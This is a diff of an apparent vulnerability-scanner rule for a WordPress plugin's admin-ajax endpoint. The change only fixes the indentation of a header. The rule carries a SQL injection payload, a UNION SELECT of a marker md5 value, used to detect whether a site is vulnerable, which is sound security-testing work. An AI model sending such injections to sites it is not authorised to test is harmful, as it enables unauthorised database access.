@@ -3,7 +3,7 @@ rules:
   - method: POST
     path: "/wp-admin/admin-ajax.php?action=get_upcp_subcategories"
     headers:
-        Content-Type: application/x-www-form-urlencoded
+      Content-Type: application/x-www-form-urlencoded
     body: |
       CatID=0 UNION SELECT md5(56565658121434894349464987),111
     expression: |
